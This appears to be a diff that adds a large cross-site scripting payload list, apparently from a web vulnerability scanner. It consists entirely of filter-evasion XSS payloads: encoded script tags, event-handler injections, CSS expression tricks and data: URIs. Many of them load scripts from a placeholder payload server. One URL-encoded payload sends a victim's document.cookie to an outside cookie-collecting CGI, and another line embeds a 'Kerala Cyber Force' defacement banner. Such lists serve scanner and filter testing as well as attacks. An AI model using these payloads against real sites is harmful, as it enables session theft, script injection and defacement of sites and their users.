+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(1)></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<object classid="clsid:..." codebase="javascript:alert(1);">
+<object data="data:text/html;base64,%25(base64)s">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></object>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>​
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnS0NGJyk8L3NjcmlwdD4=></object>
+<object data="javascript:alert(1)">
+<object data=javascript:alert(1)>
+<object data=javascript&colon;%0061&#x6C;&#101%72t(1)>
+object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+<object onerror=alert(1)>
+<object onerror=javascript:javascript:alert(1)>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<object type=image src=kcf.gif onreadystatechange=alert(1)></object>
+<object type="text/x-scriptlet" data="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"></OBJECT>
+<object type="text/x-scriptlet" data="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="%25(scriptlet)s"></OBJECT>
++onerror=alert(1)%3E/
+onerror=eval;throw'alert%281%29';
++onerror=prompt(1)%3E/
+onload='KCF' \" onload=\"KCF\"/onload=\"KCF\"/onload='KCF'/
+onmouseover=alert(1);
+'onmouseover='alert(1)'a='
+"onmouseover="alert(1)"a="
+"onmouseover=alert(1);a="
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<p/onmouseover=javascript:alert(1); >KCF</p>
+<p style="background:url('javascript:alert(1)')">
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
+<p style="font-family:'\22\3bx:expression(alert(1))/*'">
+"'`><p><svg><script>a='hello%27;javascript:alert(1)//';</script></p>
+"'`><p><svg><script>a='kcf;alert(1)//';</script></p>
+<p><svg><script>alert(1)</script></p>
+s%22%20%22+STYLE%3D%22background-image%3A+expression%28alert%28%27KCF%3F%29%29
+s%22%20style=%22background:url(javascript:alert(’KCF’))
+s%22%20style=x:expression(alert(1))
+<scr%00ipt%20&message=> alert(‘kcf’)</script>
+<<scr\0ipt/src=http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp></script
+<<scr\0ipt/src=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js></script
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+<script>~'%0061' ;  %0074%0068%0072%006F%0077 ~ %0074%0068%0069%0073.  %0061%006C%0065%0072%0074(~'%0061')</script U+
+<script>~'%0061' ; %0074%0068%0072%006F%0077 ~ %0074%0068%0069%0073. %0061%006C%0065%0072%0074(~'%0061')</script U+
+<script>({0:#0=alert/#0#/#0#(1)})</script>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
+<script>/* *%00/javascript:alert(1)// */</script>
+<script%00>javascript:alert(1)</script>
+"`'><script>%00javascript:alert(1)</script>
+<script%09>javascript:alert(1)</script>
+"`'><script>%09javascript:alert(1)</script>
+<script%09type="text/javascript">javascript:alert(1);</script>
+<script%0A>javascript:alert(1)</script>
+"`'><script>%0Ajavascript:alert(1)</script>
+<script%0Atype="text/javascript">javascript:alert(1);</script>
+"`'><script>%0Bjavascript:alert(1)</script>
+<script%0C>javascript:alert(1)</script>
+"`'><script>%0Cjavascript:alert(1)</script>
+<script%0Ctype="text/javascript">javascript:alert(1);</script>
+<script%0D>javascript:alert(1)</script>
+"`'><script>%0Djavascript:alert(1)</script>
+<script%0Dtype="text/javascript">javascript:alert(1);</script>
+<script>+-+-1-+-+alert(1)</script>
+><script>1<\\/script>
+\"><script>1<\\/script>
+\\\'><script>1<\\/script>
+<script%20>javascript:alert(1)</script>
+"`'><script>%20javascript:alert(1)</script>
+<script%20language=vbscript>msgbox%20KCF</script>
+<script%20type="text/javascript">javascript:alert(1);</script>
+"`'><script>%21javascript:alert(1)</script>
+<script>/* *%2A/javascript:alert(1)// */</script>
+"`'><script>%2Bjavascript:alert(1)</script>
+<script%2F>javascript:alert(1)</script>
+'"`><script>/* *%2Fjavascript:alert(1)// */</script>
+<script%2Ftype="text/javascript">javascript:alert(1);</script>
+"`'><script>%3Bjavascript:alert(1)</script>
+<script%3Etype="text/javascript">javascript:alert(1);</script>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+"`'><script>%7Ejavascript:alert(1)</script>
+<script>a%006cert(1);</script>
+<SCRIPT>a=/kcf/
+<SCRIPT>a=/KCF/
+<script>a='kcf\\';alert(1)//kcf';</script>
+<SCRIPT>a=/KCF/alert(a.source)</SCRIPT>
+"'`><script>a=/kcf;;i=0;alert(1);a/i;</script>
+<SCRIPT>a=/KCF/\nalert(1);</SCRIPT>
+<script ~~~>alert(0%250)</script ~~~>
+<<SCRIPT>alert(1);/
+<script>alert(1,1</script//)</script>
+<script>alert(1,1</script/)</script>
+<script>alert(1)/kcf/'</script>
+<script>’alert(1)’.replace(/.+/,eval)</script>
+<<script>alert(1);</script>
+<!-- -- --><script>alert(1);</script><!-- -- -->
+<%25<!--'%25><script>alert(1);</script -->
+<script<{alert(1)}/></script </>
+<script>/* */alert(1)// */</script>
+<script>alert(\'\\/\\1\\/\\\')</script>
+<script>alert(\'\\\\1\\\\\')</script>
+<script>alert(\'1\')</script>
+<script>alert(1)<!-- '</script>
+<script>alert(1)</script>
+<script>alert(1)</script>;
+<script>alert(1)</script>/
+<script>alert(1);</script>
+'`"><script>alert(1)</script>
+' '><script>alert(1)</script>
+''><script>alert(1)</script>
+'"`><script>/* *alert(1)// */</script>
+’><script>alert(1)</script>
+"`'><script>alert(1)</script>
+"'`><script>alert(1)</script>
+“<script>alert(1)</script>
+“><<script>alert(1);//<</script>
+“><script >alert(1)</script>
+“><script >alert(1)</script >
+&<script>alert(1);</script>
+#<script>alert(1)</script>
+“><ScRiPt>alert(1)</script>
+“><ScRiPt>alert(1)</ScRiPt>
+<<SCRIPT>alert(1);//<</SCRIPT>
+<SCRIPT> alert(\"1\")</SCRIPT>
+<SCRIPT> alert(\"1\");</SCRIPT>
+<SCRIPT>alert(1);</SCRIPT>
+<script>alert(1)<script></script>
+<script>alert%281%29</script>
+<script>alert(alert(1))</script>
+&'"><script>alert(/kcf/)</āăą>
+<!-- --!><script>alert(kcf)</script>-->
+&'"><script>alert(/kcf/)</script>
+<script>alert(/KCF/)</script>
+<script>alert("/KCF"/)</script>
+”><script>alert(“KCF”)</script>
+\"><script>alert(/KCF/)<script>
+<ScriPt>ALeRt(“ KCF ”)</scriPt>
+<<SCRIPT>alert("KCF");//<</SCRIPT>
+<SCRIPT>+alert("KCF")</SCRIPT>
+<SCRIPT>+alert("KCF");</SCRIPT>
+&'"><script>alert&lpar;&sol;kcf&sol;&rpar;<&sol;script>
+<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
+<script>alert([!![]] [])</script>
+<script>alert([!![]]+[])</script>
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<script>alert(String.fromCharCode(75,67,70))</script>
+‘><script>alert(String.fromCharCode(75,67,70))</script>
+‘/><script>alert(String.fromCharCode(75,67,70))</script>
+"><script>alert(String.fromCharCode(75,67,70))</script>
+“><script>alert(String.fromCharCode(75,67,70))</script>
+“/><script>alert(String.fromCharCode(75,67,70))</script>
+!–<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
+‘;!–<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
+<script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
+<script allbrowserkcf>/*<script* */alert(1)</script
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
+<SCRIPT "a='>'" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT a=`>` SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT a=">" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT <B>alert(1);</SCRIPT>
+"`'><script>%C2%85javascript:alert(1)</script>
+"`'><script>%C2%A0javascript:alert(1)</script>
+<script charset="%22>javascript:alert(1)</script>
+<script charset='utf-8'>alert(1)</script>
+<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%25/.test(result)&&result.length) { ids.push(1); } </script>
+<script> chr=String.fromCharCode(1); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%25/.test(result)&&result.length) { ids.push(1); } </script>
+<script /***/>/***/confirm('%FF41%FF4C%FF45%FF52%FF54%1455%FF11%1450')/***/</script /***/
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<script> document.cookie='kcf'; if(document.cookie !== 'kcf') { alert(1,document.cookie); } </script>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+"`'><script>%E1%9A%80javascript:alert(1)</script>
+"`'><script>%E1%A0%8Ejavascript:alert(1)</script>
+"`'><script>%E2%80%80javascript:alert(1)</script>
+"`'><script>%E2%80%81javascript:alert(1)</script>
+"`'><script>%E2%80%82javascript:alert(1)</script>
+"`'><script>%E2%80%83javascript:alert(1)</script>
+"`'><script>%E2%80%84javascript:alert(1)</script>
+"`'><script>%E2%80%85javascript:alert(1)</script>
+"`'><script>%E2%80%86javascript:alert(1)</script>
+"`'><script>%E2%80%87javascript:alert(1)</script>
+"`'><script>%E2%80%88javascript:alert(1)</script>
+"`'><script>%E2%80%89javascript:alert(1)</script>
+"`'><script>%E2%80%8Ajavascript:alert(1)</script>
+"`'><script>%E2%80%8Bjavascript:alert(1)</script>
+"`'><script>%E2%80%A8javascript:alert(1)</script>
+"`'><script>%E2%80%A9javascript:alert(1)</script>
+"`'><script>%E2%80%AFjavascript:alert(1)</script>
+"`'><script>%E2%81%9Fjavascript:alert(1)</script>
+"`'><script>%E3%80%80javascript:alert(1)</script>
+"`'><script>%EF%BB%BFjavascript:alert(1)</script>
+"`'><script>%EF%BF%AEjavascript:alert(1)</script>
+"`'><script>%EF%BF%BEjavascript:alert(1)</script>
+<script>eval(‘a%006cert(1)’);</script>
+<script>eval(‘a\154ert(1)’);</script>
+<script>eval(‘a%6cert(1)’);</script>
+<script>eval(‘a\l\ert\(1\)’);</script>
+<script>eval(‘al’+’ert(1)’);</script>
+<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+<script>eval(String.fromCharCode(75,67,70));</script>
+<script>execScript(“MsgBox 1”,”vbscript”);</script>
+"`'><script>%F0%90%96%9Ajavascript:alert(1)</script>
+<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>prompt(1)</SCRIPT>
+<script>function::[‘alert’](1)</script>
+<script> function a() {} </script> <img src=1 onerror="a();alert(1)">
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<script> if ('a'.trim() === '') { alert(1); } </script>
+<script>if("x\%E0%B9%92".length==2) { javascript:alert(1);}</script>
+<script>if("x\%E1%96%89".length==2) { javascript:alert(1);}</script>
+<script>if("x\%EE%A9%93".length==2) { javascript:alert(1);}</script>
+<script>if("x\".length==1) { alert(1);}</script>
+<script>if("x\".length==2) { alert(1);}</script>
+<script>if("xx" == "xx") { alert(1);}</script>
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<script itworksinallbrowsers>/*<script* */alert(1)</script ​
+<script>javascript:alert(1)<%00/script>
+<script>javascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+<script>javascript:alert(1)</script%0A
+<script>javascript:alert(1)</script%0B
+<script>javascript:alert(1)</script%0D
+><script>KCF<\/script>
+"><script>KCF<\/script>
+\'><script>KCF<\/script>
+<SCRIPT/KCF SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT/KCF SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<script language='javascript' src='%25(jscript)s'></script>
+<script language=vbs>execScript(“alert(1)”)</script>
+<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
+<script language=vbs>MsgBox 1</script>
+<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
+<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+<script onreadystatechange=alert(1)>
+<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+<script>%25(payload)s</script>
+<<SCRIPT>%25(payload)s//<</SCRIPT>
+<script>prompt(1)</script>
+‘><script>prompt(1)</script>
+‘/><script>prompt(1)</script>
+“<script>prompt(1)</script>
+“><script>prompt(1)</script>
+“/><script>prompt(1)</script>
+<ScRiPt+>prompt(1)</ScRiPt>
+<ScRIPt>prompt(1)</ScRIPt>
+‘><ScRIPt>prompt(1)</ScRIPt>
+“><ScRIPt>prompt(1)</ScRIPt>
+<script>prompt(-[])</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
+</script><script >alert(1)</script>
+</script><script>alert(KCF
+</SCRIPT>”><SCRIPT>alert(String.fromCharCode(75,67,70))
+</script><script>alert(String.fromCharCode(75,67,70))</script>
+</SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
+SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+</script><script>prompt(1)</script>
+</SCRIPT>”><SCRIPT>prompt(1)</SCRIPT>
+</SCRIPT>”>”><SCRIPT>prompt(1)</SCRIPT>
+<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<script src="#">{alert(1)}</script>;1
+<script src="data:,alert(1)"></script>
+<script src="data:%CB%8F,javascript:alert(1)"></script>
+<script/src="data&colon;text%2Fj%0061v%0061script,%0061lert('%0061')"></script a=%0061 & /=%2F
+<script/src=data&colon;text/j%0061v%0061&#115&#99&#114&#105&#112&#116,%0061%6C%65%72%74(/KCF/)></script
+<script/src=data&colon;text/j%0061v%0061&#115&#99&#114&#105&#112&#116,%0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​
+<script src="data:%D4%8F,javascript:alert(1)"></script>
+<script src="data:%E0%A4%98,javascript:alert(1)"></script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/plain%2Cjavascript:alert(1)"></script>
+<script src="data:text/plain,alert(1)"></script>
+<script src="data:text/plainalert(1)"></script>
+<SCRIPT SRC=http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp< B >
+//|\\ <script //|\\ src='http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp'> //|\\ </script //|\\
+<SCRIPT =">" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT SRC=http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>
+<SCRIPT/SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
+<SCRIPT SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.jpg"></SCRIPT>
+<SCRIPT SRC=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js< B >
+//|\\ <script //|\\ src='http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js'> //|\\ </script //|\\
+<SCRIPT =">" SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<SCRIPT SRC=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js></SCRIPT>
+<SCRIPT/SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js"></SCRIPT>
+<script src="javascript:alert(1)">
+<SCRIPT SRC="%25(jpg)s"></SCRIPT>
+<SCRIPT SRC=%25(jscript)s?<B>
+<script src="/\%25(jscript)s"></script>
+<script src="\\%25(jscript)s"></script>
+<script src=%25(jscript)s></script>
+<SCRIPT/SRC="%25(jscript)s"></SCRIPT>
+<SCRIPT SRC=//XXXxenotixXXX:3555/xss_serve_payloads/.j>
+</script><svg onload='-/"/-alert(1)//'>
+<script/&Tab; src='http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp' /&Tab;></script>
+<script/&Tab; src='http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js' /&Tab;></script>
+<script>try{eval("<></>");alert(1)}catch(e){alert(1)};</script>
+<script type="text/javascript">alert(1);</script>
+<script type=text/javascript>alert(1)</script>
+<script type="text/javascript">window.open("http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html","_self");</script>
+<script> var a=1'; alert(1); </script>
+<script> var a = "kcf"; alert(1); </script>
+<script>var a = ‘</script><script>alert(1)</script>
+<script>var var = 1; alert(var)</script>
+<script> var x = "asdf\1 asdf"; alert(1); </script>
+<script> var x = "kcf\"; alert(1); </script>
+`'"><script>window['alert'](1)</script>
+<script>window.open( "http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html" )</script>
+<script x> alert(1) </script 1=2
+<SCRIPT>x=/KCF/  alert(x.source)</SCRIPT>
+<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
+\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=KCF>
+<script>x='<script><img src=xx:xx onerror=alert(1)>';</script>
+<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script><script src=http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp>
+<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script><script src=http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js>
+<select autofocus onfocus=alert(1)>
+<select onfocus=javascript:alert(1) autofocus>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SPAN DATASRC="#KCF" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
+' style=abc:expression(KCF) ' \" style=abc:expression(KCF) \"
+<STYLE>BODY{-moz-binding:url("http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.xml#kcf")}</STYLE>
+<style><img src="</style><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+<style><img src="</style><img src=x onerror=prompt(1)//">
+<STYLE>@import'%25(css)s';</STYLE>
+<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
+<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
+<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("KCF")';</STYLE>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<STYLE>.KCF{background-image:url("javascript:alert(1)");}</STYLE>
+<STYLE>.KCF{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=KCF></A>
+<STYLE>.KCF{background-image:url("javascript:alert('KCF')");}</STYLE><A CLASS=KCF></A>
+<STYLE>.KCF{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=KCF></A>
+<STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>KCF
+<STYLE>li {list-style-image: url("javascript:alert('KCF')");}</STYLE><UL><LI>KCF</br>
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>KCF
+<STYLE>li {list-style-image: url(&quot;javascript:alert(&#39;KCF&#39;)&quot;);}</STYLE><UL><LI>KCF
+<style/onload=<!--&#09;>&#10;alert&#10;&lpar;1&rpar;>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
+<style onreadystatechange=alert(1)>
+<style onreadystatechange=javascript:javascript:alert(1);></style>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
+'"--></style></script><script>alert("KCF")</script>
+'"--></style></script><script>prompt(1)</script>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<style></style%09<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style%0A<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style%0D<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style%20<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style%3E<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style><img src="about:blank" onerror=alert(1)//></style>
+<style><!--</style><script>alert(1);//--></script>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('KCF')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
+<STYLE TYPE="text/javascript">alert(1);</STYLE>
+<STYLE TYPE="text/javascript">alert('KCF');</STYLE>
+<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
+<// style=x:expression\28javascript:alert(1)\29>
+<// style=x:expression\28write(1)\29>
+<style>*{x:expression(write(1))}</style>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg/onload=alert(1)
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<sVg><scRipt %00>prompt&lpar;/
+<svg><script ?>alert(1)
+<svg><script>alert(1)</script></svg>
+<svg><script>lo<sv>gChr(1)</script></svg>
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<svg><script x:href='http://XXXxenotixXXX:3555/xss_serve_payloads/bmpz.bmp'
+<svg><script x:href='http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.js'
+<svg><script xlink:href=data&colon;,window.open('https://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html')></script
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<svg><style><img/src=x onerror=alert(1)// </b>
+<svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29;
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<TABLE BACKGROUND="javascript:alert(1)">
+<table background="javascript:alert(1)"></table>
+<TABLE BACKGROUND="javascript:alert('KCF')">
+<table background="javascript:javascript:alert(1)">
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+<TABLE><TD BACKGROUND="javascript:alert(1)">
+<TABLE><TD BACKGROUND="javascript:alert('KCF')">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+<textarea autofocus onfocus=alert(1)>
+<textarea onfocus=javascript:alert(1) autofocus>
+<title>kcf<script>alert(1)</script></title>
+<title onpropertychange=alert(1)></title><title title=></title>
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+</TITLE><SCRIPT>alert(1);</SCRIPT>
+</TITLE><SCRIPT>alert("KCF");</SCRIPT>
+></title><script>alert(KCF)</script>'"><marquee><h1>Kerala Cyber Force</h1></marquee>
+" type=image src=null onerror=KCF " \' type=image src=null onerror=KCF \'
+?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
+<var onmouseover="prompt(1)">KCF</var>​
+<video onerror="javascript:alert(1)"><source>
+<video onerror="javascript:javascript:alert(1)"><source>
+<video poster=javascript:alert(1)//></video>
+<video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
+<video poster=javascript:javascript:alert(1)//
+<video><source onerror="alert(1)">
+<video><source onerror="javascript:alert(1)">
+<video><source onerror="javascript:javascript:alert(1)">
+<video><source onerror="prompt(1)">
+<video><source onerror="prompt(1)"></source></video>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<video src=1 onerror=alert(1)>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%25;height:100%25 src=%25(vml)s#kcf></vmlframe>
+X<form id=test><input></form><button form=test onformchange==javascript:alert(1)>X
+X<form id=test onforminput=javascript:alert(1)><input></form>
+<XML ID=0><I><B><IMG SRC="javas<!-- -->cript:alert(1)"></B></I></XML>
+<XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]>
